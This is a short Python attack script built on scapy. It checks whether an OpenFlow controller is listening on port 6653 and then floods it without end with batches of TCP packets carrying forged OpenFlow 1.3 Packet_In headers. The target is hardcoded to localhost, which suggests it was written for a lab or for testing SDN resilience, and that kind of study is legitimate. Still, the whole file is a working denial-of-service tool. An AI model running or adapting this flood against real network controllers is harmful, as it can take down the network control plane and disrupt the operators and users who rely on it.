#!/usr/bin/env python3
import socket
from scapy.all import IP, TCP, Raw, send

OF_PORT = 6653
ATTACK_SPORT = 50000

# 8 byte structure of the OF 1.3 Packet_In header
# version=0x04, type=0x0a, length=0x0008, xid=0x00000000
# 0x04 means OpenFlow 1.3 and type 10 means Packet_In
PACKET_IN_PAYLOAD = b"\x04\x0a\x00\x08\x00\x00\x00\x00"


def detect_controller(target_ip, port=OF_PORT, timeout=2):

    # ss -tnlp is equivalent on local device
    # Setup the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        # Try to connect to the target IP:port
        sock.connect((target_ip, port))
        sock.close()
        # if successful, return ip:port
        return target_ip, port
    except:
        # if connection fails, print error and return None
        print(f"Could not connect to {target_ip}:{port}")
        sock.close()
        return None, None

def flood(target_ip, target_port, sport=ATTACK_SPORT, batch=1000):
    # build the packet headers (IP and TCP) and add the raw bytes OF payload
    pkt = (IP(dst=target_ip) /
           TCP(sport=sport, dport=target_port, flags="PA") /
           Raw(load=PACKET_IN_PAYLOAD))

    # multiply the packets in a batch format to increase the sending speed.
    pkts = [pkt] * batch

    print(f"Flooding {target_ip}:{target_port} from port {sport}...")
    sent_count = 0
    # Start flooding the device and print the count 
    while True:
        send(pkts, verbose=False)
        sent_count += batch
        print(f"   sent {sent_count} packets.")

def main():
    target_ip = "127.0.0.1"
    # check the target_ip and port
    ip,port = detect_controller(target_ip)
    # if the device isn't reachable, print and return
    if ip is None:
        print(f"No controller found at {target_ip}:{OF_PORT}")
        return
    print(f"Controller found at {ip}:{port}")
    # flood if the device is reachable
    flood(ip, port)


if __name__ == "__main__":
    main()